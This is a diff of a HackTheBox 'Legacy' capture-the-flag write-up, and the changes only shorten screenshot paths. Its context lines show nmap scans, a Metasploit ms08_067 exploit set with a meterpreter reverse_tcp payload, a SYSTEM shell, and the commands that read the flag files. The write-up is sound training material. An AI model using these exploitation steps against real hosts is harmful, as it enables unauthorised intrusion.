@@ -43,7 +43,7 @@ Verify if the host is alive using ICMP:
 ping -c 1 10.10.10.4
 ```
 
-![ping](cases/HackTheBox/Machines/EASY/Legacy/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -66,7 +66,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![allports](cases/HackTheBox/Machines/EASY/Legacy/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -74,7 +74,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/Legacy/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -92,7 +92,7 @@ nmap -p135,139,445 -sC -sV 10.10.10.4 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-![targeted](cases/HackTheBox/Machines/EASY/Legacy/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -131,7 +131,7 @@ msfconsole
 search ms08_067
 ```
 
-![msfconsole_ms08_067](cases/HackTheBox/Machines/EASY/Legacy/screenshots/msfconsole_ms08_067.png)
+![msfconsole_ms08_067](screenshots/msfconsole_ms08_067.png)
 
 Configure and run the exploit:
 
@@ -144,7 +144,7 @@ set payload windows/meterpreter/reverse_tcp
 exploit
 ```
 
-![exploit_run](cases/HackTheBox/Machines/EASY/Legacy/screenshots/exploit_run.png)
+![exploit_run](screenshots/exploit_run.png)
 
 âœ… We obtain a shell with SYSTEM privileges.
 
@@ -159,7 +159,7 @@ The user flag is saved in `john` user inside the `Documents and Settings`directo
 type C:\Documents and Settings\john\Desktop\user.txt
 ```
 
-![user_flag](cases/HackTheBox/Machines/EASY/Legacy/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 âœ… **User flag obtained**
 
@@ -172,7 +172,7 @@ We are root, so we can go to `Administrator` directory for the root flag:
 type C:\Documents and Settings\Administrator\Desktop\root.txt
 ```
 
-![root_flag](cases/HackTheBox/Machines/EASY/Legacy/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 âœ… **Root flag obtained**
 
